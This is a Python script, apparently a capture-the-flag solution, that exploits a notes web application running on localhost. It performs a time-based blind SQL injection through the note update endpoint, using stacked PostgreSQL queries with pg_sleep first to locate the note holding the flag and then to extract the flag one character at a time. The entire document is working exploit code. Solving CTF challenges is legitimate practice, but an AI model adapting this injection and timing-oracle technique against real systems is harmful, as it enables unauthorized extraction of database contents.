import requests
import json
import string


s = requests.Session()

# login
# PUT HERE VALID CREDENTIALS
response = s.post("http://localhost:8080/api/login",
                  json={"username": "asdf", "password": "asdf"})

# create new note to use
response = s.post("http://localhost:8080/api/note/new",
                  json={"note": "asdfasdf"})

note = json.loads(response.content)

flag_id = 1300

# adjust timeout if you get to many false positives
payload_seconds = 1
print("[*] searching flag id")
while True:
    payload = "1234' where id = " + \
        str(note['id']) + \
        "; select case when substring(\"Note\".\"note\",1,5)='HV22{' then pg_sleep("+str(
            payload_seconds)+") else pg_sleep(0) end from \"notes\" AS \"Note\" where id='"+str(flag_id)+"'limit 1; --"
    response = s.post("http://localhost:8080/api/note/update",
                      json={"id": note['id'], "note": payload})

    if(response.elapsed.seconds >= payload_seconds):
        print("[*] flag ID found " + str(flag_id))
        break

    flag_id = flag_id + 1

print("[*] dumping content")
length = 6
flag = "HV22{"

strings_index = 0
char = string.printable[strings_index]
while True:
    payload = "1234' where id = " + \
        str(note['id']) + \
        "; select case when substring(\"Note\".\"note\",1,"+str(length)+")='"+flag+char+"' then pg_sleep("+str(
            payload_seconds)+") else pg_sleep(0) end from \"notes\" AS \"Note\" where id='"+str(flag_id)+"'limit 1; --"
    response = s.post("http://localhost:8080/api/note/update",
                      json={"id": note['id'], "note": payload})

    if(strings_index + 1 >= len(string.printable)):
        break

    if(response.elapsed.seconds >= payload_seconds):
        flag = flag + char
        print("[*] flag char found: " + flag)
        length = length + 1
        strings_index = 0
        char = string.printable[strings_index]
    else:
        strings_index = strings_index + 1
        char = string.printable[strings_index]

print("[*] Flag found! " + flag)
